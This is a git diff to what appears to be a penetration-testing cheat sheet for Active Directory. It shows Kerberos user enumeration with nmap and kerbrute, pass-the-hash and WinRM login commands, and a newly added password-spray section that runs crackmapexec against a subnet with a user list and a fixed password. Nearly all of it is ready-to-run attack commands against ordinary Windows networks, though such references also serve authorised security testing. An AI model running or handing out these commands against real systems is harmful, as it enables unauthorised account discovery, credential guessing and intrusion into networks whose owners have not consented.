@@ -57,7 +57,7 @@ Surname.N
 nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.real='test.local', userdb=usernames.txt <ip>
 ```
 ```bash
-kerbrute userenum -d test.local usernames.txt
+kerbrute userenum --dc 10.10.10.100 -d test.local usernames.txt
 ```
 ### NTLM Creds
 ```bash
@@ -102,4 +102,11 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u user -H hash
 ```
 ```bash
 evil-winrm -i 10.10.10.100 -u test -p password123
+```
+### Password spray
+```bash
+crackmapexec smb 10.10.10.10/23 -u userlist -p userlist --continue-on-success 
+```
+```bash
+crackmapexec smb 10.10.10.10/23 -u userlist -p 'PassworSpray' --continue-on-success 
 ```
